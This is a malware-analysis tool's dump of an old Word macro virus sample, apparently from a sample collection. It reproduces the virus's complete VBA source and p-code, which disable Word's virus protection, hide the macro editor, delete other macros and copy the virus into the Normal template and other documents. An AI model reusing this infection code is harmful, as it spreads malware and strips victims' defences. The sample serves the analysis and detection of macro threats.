olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CyberHack.as
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CyberHack.as - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO CyberHack.bas 
in file: Virus.MSWord.CyberHack.as - OLE stream: 'Macros/VBA/CyberHack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Macros By WinK'S Hacker
' Picture By Casper Satan

' Lebih baik mencoba dari pada tidak tahu sama sekali ...
' Mohon ma'af bila telah mengganggu Anda.
' Microsoft memang gila ! Nambahin fasilitas pemrogramannya
' keterlaluan untuk suatu word prosesor.
Public AlAsal
Public DokSave
Public Norok
Public Dokok
Sub CyInit()
    AlAsal = Application.DisplayAlerts
    Application.DisplayAlerts = wdAlertsNone
    Call Tahan

    CommandBars("Visual Basic").Enabled = False
    CommandBars("Visual Basic").Protection = msoBarNoChangeVisible
    CommandBars("Visual Basic").Protection = msoBarNoCustomize
    On Error Resume Next
    CommandBars("Tools").Controls("Macro").Delete
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
    FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
    On Error GoTo 0
End Sub
Sub CyClose()
Application.DisplayAlerts = AlAsal
End Sub
Sub Dok2Nor()
    Call Tahan
    On Error GoTo Erw1
    Norok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh1a
    For I = 1 To nt.VBProject.VBComponents.Count
      NMacr = nt.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Norok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And (NMacr <> "ThisDocument") Then
        Application.OrganizerDelete Source:=nt.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next I
Erh1a:
    If Norok = False Then
      On Error GoTo Erh1
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=ad.FullName, _
          Destination:=nt.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      Templates(nt.FullName).Save
Erh1:
    End If
Erw1:
End Sub
Sub Nor2Dok()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set ad = ActiveDocument
    Set nt = NormalTemplate
    On Error GoTo Erh2a
    For I = 1 To ad.VBProject.VBComponents.Count
      NMacr = ad.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Dokok = True
      NMacr = nt.VBProject.VBComponents(I).Name
      If NMacr = "CyberHack" Then Dokok = True
      If (NMacr <> "CyberHack") And (NMacr <> "CyberForm") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
        Application.OrganizerDelete Source:=ad.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next I
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "CyberHack", Object:=wdOrganizerObjectProjectItems
      Application.OrganizerCopy Source:=nt.FullName, _
          Destination:=ad.FullName, Name:= _
          "CyberForm", Object:=wdOrganizerObjectProjectItems
      DokSave = 1
Erh2:
    End If
Erw2:
End Sub
Sub Cyber()
    Call CyInit
    Call Dok2Nor
    Call CyClose
End Sub
Sub Tahan()
    With Options
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
End Sub
Sub Simpan()
    On Error GoTo Erh4
Set ad = ActiveDocument
    If DokSave = 1 Then
       ad.SaveAs FileName:=ad.Name, FileFormat:=wdFormatDocument
    End If
Erh4:
End Sub
Sub AutoOpen()
    Call Cyber
End Sub
Sub fileclose()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    WordBasic.fileclose
End Sub
Sub FileOpen()
    Call Cyber
    Dialogs(wdDialogFileOpen).Show
    Call CyInit
    Call Nor2Dok
    Call Simpan
    Call CyClose
End Sub
Sub FileSaveAs()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub filesave()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    Call CyClose
    On Error GoTo Errh1
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Errh1:
End Sub
Sub HelpAbout()
    On Error GoTo Erw3
    CyberForm.Show
Erw3:
End Sub
Sub FileExit()
    Call CyInit
    Call Dok2Nor
    Call Nor2Dok
    On Error GoTo Erw4
    If WeekDay(Date) = 6 Then CyberForm.Show
Erw4:
    Call CyClose
    WordBasic.FileExit
End Sub
Sub ToolsOptions()
    Dialogs(wdDialogToolsOptions).Show
    Call Cyber
End Sub
Sub FileNew()
    Call Cyber
    Dialogs(wdDialogFileNew).Show
End Sub
Sub FileTemplates()
    Call Cyber
End Sub
Sub ToolsCustomize()
    Call Cyber
End Sub
Sub ToolsCustomizeKeyboard()
    Call Cyber
End Sub
Sub ViewVBCode()
    Call Cyber
End Sub
Sub Organizer()
End Sub





.........................
-------------------------------------------------------------------------------
VBA MACRO CyberForm.frm 
in file: Virus.MSWord.CyberHack.as - OLE stream: 'Macros/VBA/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 































































































































Private Sub CommandButton1_Click()
Unload Me
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.CyberHack.as
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/CyberHack - 8874 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0018 " Macros By WinK'S Hacker"
' Line #1:
' 	QuoteRem 0x0000 0x0018 " Picture By Casper Satan"
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0038 " Lebih baik mencoba dari pada tidak tahu sama sekali ..."
' Line #4:
' 	QuoteRem 0x0000 0x0028 " Mohon ma'af bila telah mengganggu Anda."
' Line #5:
' 	QuoteRem 0x0000 0x003A " Microsoft memang gila ! Nambahin fasilitas pemrogramannya"
' Line #6:
' 	QuoteRem 0x0000 0x0027 " keterlaluan untuk suatu word prosesor."
' Line #7:
' 	Dim (Public) 
' 	VarDefn AlAsal
' Line #8:
' 	Dim (Public) 
' 	VarDefn DokSave
' Line #9:
' 	Dim (Public) 
' 	VarDefn Norok
' Line #10:
' 	Dim (Public) 
' 	VarDefn Dokok
' Line #11:
' 	FuncDefn (Sub CyInit())
' Line #12:
' 	Ld Application 
' 	MemLd DisplayAlerts 
' 	St AlAsal 
' Line #13:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #14:
' 	ArgsCall (Call) Tahan 0x0000 
' Line #15:
' Line #16:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #17:
' 	Ld msoBarNoChangeVisible 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #18:
' 	Ld msoBarNoCustomize 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Protection 
' Line #19:
' 	OnError (Resume Next) 
' Line #20:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #21:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #22:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #23:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #24:
' 	OnError (GoTo 0) 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Sub CyClose())
' Line #27:
' 	Ld AlAsal 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Sub Dok2Nor())
' Line #30:
' 	ArgsCall (Call) Tahan 0x0000 
' Line #31:
' 	OnError Erw1 
' Line #32:
' 	LitVarSpecial (False)
' 	St Norok 
' Line #33:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ad 
' Line #34:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set nt 
' Line #35:
' 	OnError Erh1a 
' Line #36:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #37:
' 	Ld I 
' 	Ld nt 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #38:
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Norok 
' 	EndIf 
' Line #39:
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberForm"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #40:
' 	LineCont 0x0004 09 00 0C 00
' 	Ld nt 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #43:
' 	Label Erh1a 
' Line #44:
' 	Ld Norok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #45:
' 	OnError Erh1 
' Line #46:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld ad 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nt 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "CyberHack"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #47:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld ad 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld nt 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "CyberForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld nt 
' 	MemLd FullName 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #49:
' 	Label Erh1 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Label Erw1 
' Line #52:
' 	EndSub 
' Line #53:
' 	FuncDefn (Sub Nor2Dok())
' Line #54:
' 	OnError Erw2 
' Line #55:
' 	LitDI2 0x0000 
' 	St DokSave 
' Line #56:
' 	LitVarSpecial (False)
' 	St Dokok 
' Line #57:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ad 
' Line #58:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set nt 
' Line #59:
' 	OnError Erh2a 
' Line #60:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #61:
' 	Ld I 
' 	Ld ad 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #62:
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dokok 
' 	EndIf 
' Line #63:
' 	Ld I 
' 	Ld nt 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St NMacr 
' Line #64:
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Dokok 
' 	EndIf 
' Line #65:
' 	LineCont 0x0004 0D 00 08 00
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberHack"
' 	Ne 
' 	Paren 
' 	Ld NMacr 
' 	LitStr 0x0009 "CyberForm"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Paren 
' 	And 
' 	Ld NMacr 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #66:
' 	LineCont 0x0004 09 00 0A 00
' 	Ld ad 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NMacr 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	Label Erh2a 
' Line #70:
' 	Ld Dokok 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #71:
' 	OnError Erh2 
' Line #72:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld nt 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ad 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "CyberHack"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	LineCont 0x0008 09 00 0A 00 11 00 0A 00
' 	Ld nt 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ad 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "CyberForm"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #74:
' 	LitDI2 0x0001 
' 	St DokSave 
' Line #75:
' 	Label Erh2 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	Label Erw2 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub Cyber())
' Line #80:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #81:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #82:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #83:
' 	EndSub 
' Line #84:
' 	FuncDefn (Sub Tahan())
' Line #85:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #86:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #87:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #88:
' 	EndWith 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub Simpan())
' Line #91:
' 	OnError Erh4 
' Line #92:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ad 
' Line #93:
' 	Ld DokSave 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #94:
' 	Ld ad 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ad 
' 	ArgsMemCall SaveAs 0x0002 
' Line #95:
' 	EndIfBlock 
' Line #96:
' 	Label Erh4 
' Line #97:
' 	EndSub 
' Line #98:
' 	FuncDefn (Sub AutoOpen())
' Line #99:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #100:
' 	EndSub 
' Line #101:
' 	FuncDefn (Sub fileclose())
' Line #102:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #103:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #104:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #105:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #106:
' 	Ld WordBasic 
' 	ArgsMemCall fileclose 0x0000 
' Line #107:
' 	EndSub 
' Line #108:
' 	FuncDefn (Sub FileOpen())
' Line #109:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #110:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #111:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #112:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #113:
' 	ArgsCall (Call) Simpan 0x0000 
' Line #114:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Sub FileSaveAs())
' Line #117:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #118:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #119:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #120:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #121:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Sub filesave())
' Line #124:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #125:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #126:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #127:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #128:
' 	OnError Errh1 
' Line #129:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #130:
' 	Label Errh1 
' Line #131:
' 	EndSub 
' Line #132:
' 	FuncDefn (Sub HelpAbout())
' Line #133:
' 	OnError Erw3 
' Line #134:
' 	Ld CyberForm 
' 	ArgsMemCall Show 0x0000 
' Line #135:
' 	Label Erw3 
' Line #136:
' 	EndSub 
' Line #137:
' 	FuncDefn (Sub FileExit())
' Line #138:
' 	ArgsCall (Call) CyInit 0x0000 
' Line #139:
' 	ArgsCall (Call) Dok2Nor 0x0000 
' Line #140:
' 	ArgsCall (Call) Nor2Dok 0x0000 
' Line #141:
' 	OnError Erw4 
' Line #142:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CyberForm 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #143:
' 	Label Erw4 
' Line #144:
' 	ArgsCall (Call) CyClose 0x0000 
' Line #145:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub ToolsOptions())
' Line #148:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #149:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub FileNew())
' Line #152:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #153:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #154:
' 	EndSub 
' Line #155:
' 	FuncDefn (Sub FileTemplates())
' Line #156:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub ToolsCustomize())
' Line #159:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #160:
' 	EndSub 
' Line #161:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #162:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #163:
' 	EndSub 
' Line #164:
' 	FuncDefn (Sub ViewVBCode())
' Line #165:
' 	ArgsCall (Call) Cyber 0x0000 
' Line #166:
' 	EndSub 
' Line #167:
' 	FuncDefn (Sub Organizer())
' Line #168:
' 	EndSub 
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' 	Reparse 0x0019 "........................."
' Macros/VBA/CyberForm - 2858 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' Line #46:
' Line #47:
' Line #48:
' Line #49:
' Line #50:
' Line #51:
' Line #52:
' Line #53:
' Line #54:
' Line #55:
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Line #63:
' Line #64:
' Line #65:
' Line #66:
' Line #67:
' Line #68:
' Line #69:
' Line #70:
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' Line #75:
' Line #76:
' Line #77:
' Line #78:
' Line #79:
' Line #80:
' Line #81:
' Line #82:
' Line #83:
' Line #84:
' Line #85:
' Line #86:
' Line #87:
' Line #88:
' Line #89:
' Line #90:
' Line #91:
' Line #92:
' Line #93:
' Line #94:
' Line #95:
' Line #96:
' Line #97:
' Line #98:
' Line #99:
' Line #100:
' Line #101:
' Line #102:
' Line #103:
' Line #104:
' Line #105:
' Line #106:
' Line #107:
' Line #108:
' Line #109:
' Line #110:
' Line #111:
' Line #112:
' Line #113:
' Line #114:
' Line #115:
' Line #116:
' Line #117:
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' Line #122:
' Line #123:
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #128:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #129:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.as' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Booke
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.as' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Raleigh DmBd BT
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.as' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Casper'S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.CyberHack.as' - OLE stream: 'Macros/CyberForm/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WinK'S'S
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.CyberHack.as' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.CyberHack.as' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox2'" IN 'Virus.MSWord.CyberHack.as' - OLE stream: 'Macros/CyberForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

